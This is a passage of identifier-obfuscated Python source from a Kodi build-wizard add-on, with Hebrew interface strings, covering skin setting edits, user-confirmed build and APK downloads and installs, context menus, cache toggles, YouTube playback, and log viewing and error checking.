			OOOO000000O00OOO0 .write (O0OOOO00OO0OOOO0O .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O00O0O0OOOOO0OOOO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4261
			OOOO000000O00OOO0 .close ()#line:4262
			O0O0000O000OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4266
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'r')#line:4268
			O0OOOO00OO0OOOO0O =OOOO000000O00OOO0 .read ()#line:4269
			OOOO000000O00OOO0 .close ()#line:4270
			OOO0OOO0000O000O0 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4271
			O00O0O0OOOOO0OOOO =re .compile (OOO0OOO0000O000O0 ).findall (O0OOOO00OO0OOOO0O )[0 ]#line:4272
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'w')#line:4273
			OOOO000000O00OOO0 .write (O0OOOO00OO0OOOO0O .replace ('<setting id="show.cdart" type="bool%s/setting>'%O00O0O0OOOOO0OOOO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4274
			OOOO000000O00OOO0 .close ()#line:4275
			O0O0000O000OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4279
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'r')#line:4281
			O0OOOO00OO0OOOO0O =OOOO000000O00OOO0 .read ()#line:4282
			OOOO000000O00OOO0 .close ()#line:4283
			OOO0OOO0000O000O0 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4284
			O00O0O0OOOOO0OOOO =re .compile (OOO0OOO0000O000O0 ).findall (O0OOOO00OO0OOOO0O )[0 ]#line:4285
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'w')#line:4286
			OOOO000000O00OOO0 .write (O0OOOO00OO0OOOO0O .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O00O0O0OOOOO0OOOO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4287
			OOOO000000O00OOO0 .close ()#line:4288
		except :#line:4293
			pass #line:4294
def thirdPartyInstall (OOOO000OO0O00OO00 ,OO0O0OO00OOOOO00O ):#line:4296
	if not wiz .workingURL (OO0O0OO00OOOOO00O ):#line:4297
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4298
	O000OO0O00OO000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO000OO0O00OO00 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4299
	if O000OO0O00OO000OO ==1 :#line:4300
		freshStart ('third',True )#line:4301
	wiz .clearS ('build')#line:4302
	O0OOO00O0O000OOO0 =OOOO000OO0O00OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4303
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4304
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000OO0O00OO00 ),'','אנא המתן')#line:4305
	OOOOO00O00OO00O00 =os .path .join (PACKAGES ,'%s.zip'%O0OOO00O0O000OOO0 )#line:4306
	try :os .remove (OOOOO00O00OO00O00 )#line:4307
	except :pass #line:4308
	downloader .download (OO0O0OO00OOOOO00O ,OOOOO00O00OO00O00 ,DP )#line:4309
	xbmc .sleep (1000 )#line:4310
	O0O00O0O0OOO0OOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000OO0O00OO00 )#line:4311
	DP .update (0 ,O0O00O0O0OOO0OOOO ,'','אנא המתן')#line:4312
	OOOO0OO0O00OO0000 ,O0O000O00O0O0O0O0 ,OO0O0O000O00OOOO0 =extract .all (OOOOO00O00OO00O00 ,HOME ,DP ,title =O0O00O0O0OOO0OOOO )#line:4313
	if int (float (OOOO0OO0O00OO0000 ))>0 :#line:4314
		wiz .fixmetas ()#line:4315
		wiz .lookandFeelData ('save')#line:4316
		wiz .defaultSkin ()#line:4317
		wiz .setS ('installed','true')#line:4319
		wiz .setS ('extract',str (OOOO0OO0O00OO0000 ))#line:4320
		wiz .setS ('errors',str (O0O000O00O0O0O0O0 ))#line:4321
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOO0OO0O00OO0000 ,O0O000O00O0O0O0O0 ))#line:4322
		try :os .remove (OOOOO00O00OO00O00 )#line:4323
		except :pass #line:4324
		if int (float (O0O000O00O0O0O0O0 ))>0 :#line:4325
			OO0OO00OO00O0OO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000OO0O00OO00 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOO0OO0O00OO0000 ,'%',COLOR1 ,O0O000O00O0O0O0O0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4326
			if OO0OO00OO00O0OO0O :#line:4327
				if isinstance (O0O000O00O0O0O0O0 ,unicode ):#line:4328
					OO0O0O000O00OOOO0 =OO0O0O000O00OOOO0 .encode ('utf-8')#line:4329
				wiz .TextBox (ADDONTITLE ,OO0O0O000O00OOOO0 )#line:4330
	DP .close ()#line:4331
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4332
	if INSTALLMETHOD ==1 :O00OO00OOO000O0O0 =1 #line:4333
	elif INSTALLMETHOD ==2 :O00OO00OOO000O0O0 =0 #line:4334
	else :O00OO00OOO000O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4335
	if O00OO00OOO000O0O0 ==1 :wiz .reloadFix ()#line:4336
	else :wiz .killxbmc (True )#line:4337
def testTheme (OO0OO0OOO0OO000O0 ):#line:4339
	OOOO0OO0O0000OO0O =zipfile .ZipFile (OO0OO0OOO0OO000O0 )#line:4340
	for O0000OO0O0000OOOO in OOOO0OO0O0000OO0O .infolist ():#line:4341
		if '/settings.xml'in O0000OO0O0000OOOO .filename :#line:4342
			return True #line:4343
	return False #line:4344
def testGui (OOO0OOO00O00O0O0O ):#line:4346
	O000OO00OO0000O00 =zipfile .ZipFile (OOO0OOO00O00O0O0O )#line:4347
	for O0000000000O0000O in O000OO00OO0000O00 .infolist ():#line:4348
		if '/guisettings.xml'in O0000000000O0000O .filename :#line:4349
			return True #line:4350
	return False #line:4351
def apkInstaller (O0O00OO000OO0OO0O ,OOO0OOOOO0OOO0OOO ):#line:4353
	wiz .log (O0O00OO000OO0OO0O )#line:4354
	wiz .log (OOO0OOOOO0OOO0OOO )#line:4355
	if wiz .platform ()=='android':#line:4356
		O0000O00O0000O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00OO000OO0OO0O ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4357
		if not O0000O00O0000O0OO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4358
		O0O0OO0OOO0O0OOOO =O0O00OO000OO0OO0O #line:4359
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4360
		if not wiz .workingURL (OOO0OOOOO0OOO0OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4361
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OO0OOO0O0OOOO ),'','אנא המתן')#line:4362
		OOO0OO000000O000O =os .path .join (PACKAGES ,"%s.apk"%O0O00OO000OO0OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4363
		try :os .remove (OOO0OO000000O000O )#line:4364
		except :pass #line:4365
		downloader .download (OOO0OOOOO0OOO0OOO ,OOO0OO000000O000O ,DP )#line:4366
		xbmc .sleep (100 )#line:4367
		DP .close ()#line:4368
		notify .apkInstaller (O0O00OO000OO0OO0O )#line:4369
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOO0OO000000O000O +'")')#line:4370
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4371
def createMenu (OO00O00OOO00O0O00 ,O00O0000O0OOO0OOO ,OOO00O00OO00OOOOO ):#line:4377
	if OO00O00OOO00O0O00 =='saveaddon':#line:4378
		OOOOOO0OO00O0O0O0 =[]#line:4379
		O0000O000OOO00OO0 =urllib .quote_plus (O00O0000O0OOO0OOO .lower ().replace (' ',''))#line:4380
		O0OOOO00O00O0O000 =O00O0000O0OOO0OOO .replace ('Debrid','Real Debrid')#line:4381
		OOOOO0000OO0O0000 =urllib .quote_plus (OOO00O00OO00OOOOO .lower ().replace (' ',''))#line:4382
		OOO00O00OO00OOOOO =OOO00O00OO00OOOOO .replace ('url','URL Resolver')#line:4383
		OOOOOO0OO00O0O0O0 .append ((THEME2 %OOO00O00OO00OOOOO .title (),' '))#line:4384
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Save %s Data'%O0OOOO00O00O0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0000O000OOO00OO0 ,OOOOO0000OO0O0000 )))#line:4385
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Restore %s Data'%O0OOOO00O00O0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0000O000OOO00OO0 ,OOOOO0000OO0O0000 )))#line:4386
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Clear %s Data'%O0OOOO00O00O0O000 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0000O000OOO00OO0 ,OOOOO0000OO0O0000 )))#line:4387
	elif OO00O00OOO00O0O00 =='save':#line:4388
		OOOOOO0OO00O0O0O0 =[]#line:4389
		O0000O000OOO00OO0 =urllib .quote_plus (O00O0000O0OOO0OOO .lower ().replace (' ',''))#line:4390
		O0OOOO00O00O0O000 =O00O0000O0OOO0OOO .replace ('Debrid','Real Debrid')#line:4391
		OOOOO0000OO0O0000 =urllib .quote_plus (OOO00O00OO00OOOOO .lower ().replace (' ',''))#line:4392
		OOO00O00OO00OOOOO =OOO00O00OO00OOOOO .replace ('url','URL Resolver')#line:4393
		OOOOOO0OO00O0O0O0 .append ((THEME2 %OOO00O00OO00OOOOO .title (),' '))#line:4394
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Register %s'%O0OOOO00O00O0O000 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0000O000OOO00OO0 ,OOOOO0000OO0O0000 )))#line:4395
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Save %s Data'%O0OOOO00O00O0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0000O000OOO00OO0 ,OOOOO0000OO0O0000 )))#line:4396
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Restore %s Data'%O0OOOO00O00O0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0000O000OOO00OO0 ,OOOOO0000OO0O0000 )))#line:4397
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Import %s Data'%O0OOOO00O00O0O000 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0000O000OOO00OO0 ,OOOOO0000OO0O0000 )))#line:4398
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Clear Addon %s Data'%O0OOOO00O00O0O000 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0000O000OOO00OO0 ,OOOOO0000OO0O0000 )))#line:4399
	elif OO00O00OOO00O0O00 =='install':#line:4400
		OOOOOO0OO00O0O0O0 =[]#line:4401
		OOOOO0000OO0O0000 =urllib .quote_plus (OOO00O00OO00OOOOO )#line:4402
		OOOOOO0OO00O0O0O0 .append ((THEME2 %OOO00O00OO00OOOOO ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOOOO0000OO0O0000 )))#line:4403
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOOOO0000OO0O0000 )))#line:4404
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOOOO0000OO0O0000 )))#line:4405
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOOOO0000OO0O0000 )))#line:4406
		OOOOOO0OO00O0O0O0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOOOO0000OO0O0000 )))#line:4407
	OOOOOO0OO00O0O0O0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4408
	return OOOOOO0OO00O0O0O0 #line:4409
def toggleCache (O000OOO0OO0OOOO00 ):#line:4411
	OO000OO0OOOO0OO0O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4412
	O0O00O0000OO00OO0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4413
	if O000OOO0OO0OOOO00 in ['true','false']:#line:4414
		for OOO0000OO000OOO0O in OO000OO0OOOO0OO0O :#line:4415
			wiz .setS (OOO0000OO000OOO0O ,O000OOO0OO0OOOO00 )#line:4416
	else :#line:4417
		if not O000OOO0OO0OOOO00 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4418
			try :#line:4419
				OOO0000OO000OOO0O =O0O00O0000OO00OO0 [OO000OO0OOOO0OO0O .index (O000OOO0OO0OOOO00 )]#line:4420
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOO0000OO000OOO0O ))#line:4421
			except :#line:4422
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O000OOO0OO0OOOO00 ))#line:4423
		else :#line:4424
			O00000000O0OOO000 ='true'if wiz .getS (O000OOO0OO0OOOO00 )=='false'else 'false'#line:4425
			wiz .setS (O000OOO0OO0OOOO00 ,O00000000O0OOO000 )#line:4426
def playVideo (OO00O0O00O0OOOO0O ):#line:4428
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO00O0O00O0OOOO0O )#line:4429
	if 'watch?v='in OO00O0O00O0OOOO0O :#line:4430
		O0000OOO0000OO0OO ,OOOOOO0000OOOOO0O =OO00O0O00O0OOOO0O .split ('?')#line:4431
		O000000000O0OO00O =OOOOOO0000OOOOO0O .split ('&')#line:4432
		for O000000OO0OO0O000 in O000000000O0OO00O :#line:4433
			if O000000OO0OO0O000 .startswith ('v='):#line:4434
				OO00O0O00O0OOOO0O =O000000OO0OO0O000 [2 :]#line:4435
				break #line:4436
			else :continue #line:4437
	elif 'embed'in OO00O0O00O0OOOO0O or 'youtu.be'in OO00O0O00O0OOOO0O :#line:4438
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO00O0O00O0OOOO0O )#line:4439
		O0000OOO0000OO0OO =OO00O0O00O0OOOO0O .split ('/')#line:4440
		if len (O0000OOO0000OO0OO [-1 ])>5 :#line:4441
			OO00O0O00O0OOOO0O =O0000OOO0000OO0OO [-1 ]#line:4442
		elif len (O0000OOO0000OO0OO [-2 ])>5 :#line:4443
			OO00O0O00O0OOOO0O =O0000OOO0000OO0OO [-2 ]#line:4444
	wiz .log ("YouTube URL: %s"%OO00O0O00O0OOOO0O )#line:4445
	yt .PlayVideo (OO00O0O00O0OOOO0O )#line:4446
def viewLogFile ():#line:4448
	OOOO000OOO0000000 =wiz .Grab_Log (True )#line:4449
	O0O00OOOO0O0OO00O =wiz .Grab_Log (True ,True )#line:4450
	O0O0OOOO0O0OO00O0 =0 ;OO000O00OO0OO0O00 =OOOO000OOO0000000 #line:4451
	if not O0O00OOOO0O0OO00O ==False and not OOOO000OOO0000000 ==False :#line:4452
		O0O0OOOO0O0OO00O0 =DIALOG .select (ADDONTITLE ,["View %s"%OOOO000OOO0000000 .replace (LOG ,""),"View %s"%O0O00OOOO0O0OO00O .replace (LOG ,"")])#line:4453
		if O0O0OOOO0O0OO00O0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4454
	elif OOOO000OOO0000000 ==False and O0O00OOOO0O0OO00O ==False :#line:4455
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4456
		return #line:4457
	elif not OOOO000OOO0000000 ==False :O0O0OOOO0O0OO00O0 =0 #line:4458
	elif not O0O00OOOO0O0OO00O ==False :O0O0OOOO0O0OO00O0 =1 #line:4459
	OO000O00OO0OO0O00 =OOOO000OOO0000000 if O0O0OOOO0O0OO00O0 ==0 else O0O00OOOO0O0OO00O #line:4461
	O000000O0OOOO0OOO =wiz .Grab_Log (False )if O0O0OOOO0O0OO00O0 ==0 else wiz .Grab_Log (False ,True )#line:4462
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO000O00OO0OO0O00 ),O000000O0OOOO0OOO )#line:4464
def errorChecking (log =None ,count =None ,all =None ):#line:4466
	if log ==None :#line:4467
		OOO0OO0OO00O0OOOO =wiz .Grab_Log (True )#line:4468
		O0O0OO0O00O000000 =wiz .Grab_Log (True ,True )#line:4469
		if not O0O0OO0O00O000000 ==False and not OOO0OO0OO00O0OOOO ==False :#line:4470
			OOO0O000O00OOOO00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOO0OO0OO00O0OOOO .replace (LOG ,""),errorChecking (OOO0OO0OO00O0OOOO ,True ,True )),"View %s: %s error(s)"%(O0O0OO0O00O000000 .replace (LOG ,""),errorChecking (O0O0OO0O00O000000 ,True ,True ))])#line:4471
			if OOO0O000O00OOOO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4472
		elif OOO0OO0OO00O0OOOO ==False and O0O0OO0O00O000000 ==False :#line:4473
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4474
			return #line:4475
		elif not OOO0OO0OO00O0OOOO ==False :OOO0O000O00OOOO00 =0 #line:4476
		elif not O0O0OO0O00O000000 ==False :OOO0O000O00OOOO00 =1 #line:4477
		log =OOO0OO0OO00O0OOOO if OOO0O000O00OOOO00 ==0 else O0O0OO0O00O000000 #line:4478
	if log ==False :#line:4479
		if count ==None :#line:4480
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4481
			return False #line:4482
		else :#line:4483
			return 0 #line:4484
	else :#line:4485
		if os .path .exists (log ):#line:4486
			O00O0000O00O00OO0 =open (log ,mode ='r');OO00OOOO00OOO0OO0 =O00O0000O00O00OO0 .read ().replace ('\n','').replace ('\r','');O00O0000O00O00OO0 .close ()#line:4487
			O0OOOO0000O0OO0O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO00OOOO00OOO0OO0 )#line:4488
			if not count ==None :#line:4489
				if all ==None :#line:4490
					O0O00OO000OOOO0OO =0 #line:4491
					for O0O0OO0O0OO0O0OOO in O0OOOO0000O0OO0O0 :#line:4492
						if ADDON_ID in O0O0OO0O0OO0O0OOO :O0O00OO000OOOO0OO +=1 #line:4493
					return O0O00OO000OOOO0OO #line:4494
				else :return len (O0OOOO0000O0OO0O0 )#line:4495
			if len (O0OOOO0000O0OO0O0 )>0 :#line:4496
				O0O00OO000OOOO0OO =0 ;O0O0O0OOOOOO0O000 =""#line:4497
				for O0O0OO0O0OO0O0OOO in O0OOOO0000O0OO0O0 :#line:4498
					if all ==None and not ADDON_ID in O0O0OO0O0OO0O0OOO :continue #line:4499
					else :#line:4500
						O0O00OO000OOOO0OO +=1 #line:4501
						O0O0O0OOOOOO0O000 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0O00OO000OOOO0OO ,O0O0OO0O0OO0O0OOO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4502
				if O0O00OO000OOOO0OO >0 :#line:4503
					wiz .TextBox (ADDONTITLE ,O0O0O0OOOOOO0O000 )#line:4504
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4505
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4506
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4507
ACTION_PREVIOUS_MENU =10 #line:4509
ACTION_NAV_BACK =92 #line:4510
ACTION_MOVE_LEFT =1 #line:4511
ACTION_MOVE_RIGHT =2 #line:4512
ACTION_MOVE_UP =3 #line:4513
ACTION_MOVE_DOWN =4 #line:4514
ACTION_MOUSE_WHEEL_UP =104 #line:4515
ACTION_MOUSE_WHEEL_DOWN =105 #line:4516
ACTION_MOVE_MOUSE =107 #line:4517
ACTION_SELECT_ITEM =7 #line:4518
ACTION_BACKSPACE =110 #line:4519
ACTION_MOUSE_LEFT_CLICK =100 #line:4520
ACTION_MOUSE_LONG_CLICK =108 #line:4521
def LogViewer (default =None ):#line:4523
	class O0000O00OOOOOOOO0 (xbmcgui .WindowXMLDialog ):#line:4524
		def __init__ (O0O0000OOOOO0000O ,*O000000O00O00000O ,**O0000OOOO00O0O000 ):#line:4525
			O0O0000OOOOO0000O .default =O0000OOOO00O0O000 ['default']#line:4526
		def onInit (OOO000O000OOO00O0 ):#line:4528
			OOO000O000OOO00O0 .title =101 #line:4529
			OOO000O000OOO00O0 .msg =102 #line:4530
			OOO000O000OOO00O0 .scrollbar =103 #line:4531
			OOO000O000OOO00O0 .upload =201 #line:4532
			OOO000O000OOO00O0 .kodi =202 #line:4533
			OOO000O000OOO00O0 .kodiold =203 #line:4534
			OOO000O000OOO00O0 .wizard =204 #line:4535
			OOO000O000OOO00O0 .okbutton =205 #line:4536
			O0OOO0OO00OO0OO00 =open (OOO000O000OOO00O0 .default ,'r')#line:4537
			OOO000O000OOO00O0 .logmsg =O0OOO0OO00OO0OO00 .read ()#line:4538
			O0OOO0OO00OO0OO00 .close ()#line:4539
			OOO000O000OOO00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO000O000OOO00O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4540
			OOO000O000OOO00O0 .showdialog ()#line:4541
		def showdialog (O00O000000OOOO00O ):#line:4543
			O00O000000OOOO00O .getControl (O00O000000OOOO00O .title ).setLabel (O00O000000OOOO00O .titlemsg )#line:4544
			O00O000000OOOO00O .getControl (O00O000000OOOO00O .msg ).setText (wiz .highlightText (O00O000000OOOO00O .logmsg ))#line:4545
			O00O000000OOOO00O .setFocusId (O00O000000OOOO00O .scrollbar )#line:4546
		def onClick (OO0OOOO00O0O00OO0 ,O0OOO000O0OO0OOOO ):#line:4548
			if O0OOO000O0OO0OOOO ==OO0OOOO00O0O00OO0 .okbutton :OO0OOOO00O0O00OO0 .close ()#line:4549
			elif O0OOO000O0OO0OOOO ==OO0OOOO00O0O00OO0 .upload :OO0OOOO00O0O00OO0 .close ();uploadLog .Main ()#line:4550
			elif O0OOO000O0OO0OOOO ==OO0OOOO00O0O00OO0 .kodi :#line:4551
				O0000OO0000O0000O =wiz .Grab_Log (False )#line:4552
				OO000O0O00OOOOOOO =wiz .Grab_Log (True )#line:4553
				if O0000OO0000O0000O ==False :#line:4554
					OO0OOOO00O0O00OO0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4555
					OO0OOOO00O0O00OO0 .getControl (OO0OOOO00O0O00OO0 .msg ).setText ("Log File Does Not Exists!")#line:4556
				else :#line:4557
					OO0OOOO00O0O00OO0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO000O0O00OOOOOOO .replace (LOG ,''))#line:4558
					OO0OOOO00O0O00OO0 .getControl (OO0OOOO00O0O00OO0 .title ).setLabel (OO0OOOO00O0O00OO0 .titlemsg )#line:4559
					OO0OOOO00O0O00OO0 .getControl (OO0OOOO00O0O00OO0 .msg ).setText (wiz .highlightText (O0000OO0000O0000O ))#line:4560
					OO0OOOO00O0O00OO0 .setFocusId (OO0OOOO00O0O00OO0 .scrollbar )#line:4561
			elif O0OOO000O0OO0OOOO ==OO0OOOO00O0O00OO0 .kodiold :#line:4562
				O0000OO0000O0000O =wiz .Grab_Log (False ,True )#line:4563
				OO000O0O00OOOOOOO =wiz .Grab_Log (True ,True )#line:4564
				if O0000OO0000O0000O ==False :#line:4565
					OO0OOOO00O0O00OO0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4566
					OO0OOOO00O0O00OO0 .getControl (OO0OOOO00O0O00OO0 .msg ).setText ("Log File Does Not Exists!")#line:4567
				else :#line:4568
					OO0OOOO00O0O00OO0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO000O0O00OOOOOOO .replace (LOG ,''))#line:4569
					OO0OOOO00O0O00OO0 .getControl (OO0OOOO00O0O00OO0 .title ).setLabel (OO0OOOO00O0O00OO0 .titlemsg )#line:4570
					OO0OOOO00O0O00OO0 .getControl (OO0OOOO00O0O00OO0 .msg ).setText (wiz .highlightText (O0000OO0000O0000O ))#line:4571
					OO0OOOO00O0O00OO0 .setFocusId (OO0OOOO00O0O00OO0 .scrollbar )#line:4572
			elif O0OOO000O0OO0OOOO ==OO0OOOO00O0O00OO0 .wizard :#line:4573
				O0000OO0000O0000O =wiz .Grab_Log (False ,False ,True )#line:4574
				OO000O0O00OOOOOOO =wiz .Grab_Log (True ,False ,True )#line:4575
				if O0000OO0000O0000O ==False :#line:4576
					OO0OOOO00O0O00OO0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4577
					OO0OOOO00O0O00OO0 .getControl (OO0OOOO00O0O00OO0 .msg ).setText ("Log File Does Not Exists!")#line:4578
				else :#line:4579
					OO0OOOO00O0O00OO0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO000O0O00OOOOOOO .replace (ADDONDATA ,''))#line:4580
					OO0OOOO00O0O00OO0 .getControl (OO0OOOO00O0O00OO0 .title ).setLabel (OO0OOOO00O0O00OO0 .titlemsg )#line:4581
					OO0OOOO00O0O00OO0 .getControl (OO0OOOO00O0O00OO0 .msg ).setText (wiz .highlightText (O0000OO0000O0000O ))#line:4582
					OO0OOOO00O0O00OO0 .setFocusId (OO0OOOO00O0O00OO0 .scrollbar )#line:4583
		def onAction (OOOO00O0O0OOO00O0 ,O00OO00O0OO0OOO0O ):#line:4585
			if O00OO00O0OO0OOO0O ==ACTION_PREVIOUS_MENU :OOOO00O0O0OOO00O0 .close ()#line:4586
			elif O00OO00O0OO0OOO0O ==ACTION_NAV_BACK :OOOO00O0O0OOO00O0 .close ()#line:4587
	if default ==None :default =wiz .Grab_Log (True )#line:4588
	O0O0OOOO0OOOOO0O0 =O0000O00OOOOOOOO0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4589
	O0O0OOOO0OOOOO0O0 .doModal ()#line:4590
	del O0O0OOOO0OOOOO0O0 #line:4591
def removeAddon (OO0OO000000O0OOOO ,OO00OOOOOOO00OO00 ,over =False ):#line:4593
	if not over ==False :#line:4594
		OOOOOOOO0O000OOOO =1 #line:4595
	else :#line:4596
